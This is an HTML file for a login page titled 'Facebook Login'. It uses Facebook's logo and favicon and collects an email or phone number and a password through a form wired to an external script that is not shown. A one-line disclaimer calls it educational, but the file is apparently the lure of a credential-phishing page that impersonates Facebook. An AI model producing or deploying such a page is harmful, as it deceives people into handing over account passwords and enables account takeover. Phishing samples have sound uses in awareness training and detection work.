<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="css/styles.css">
    <link rel="icon" href="images/fb.ico">
</head>

<body>
    <div class="login-container">
        <img src="images/logo.png" alt="Facebook Logo" class="logo">
        <form id="login-form">
            <input type="text" id="email" name="email" placeholder="Email or Phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p class="disclaimer">⚠️ This page is for educational purposes only. Do not use it maliciously.</p>
    </div>
    <script src="script.js"></script>
</body>

</html>
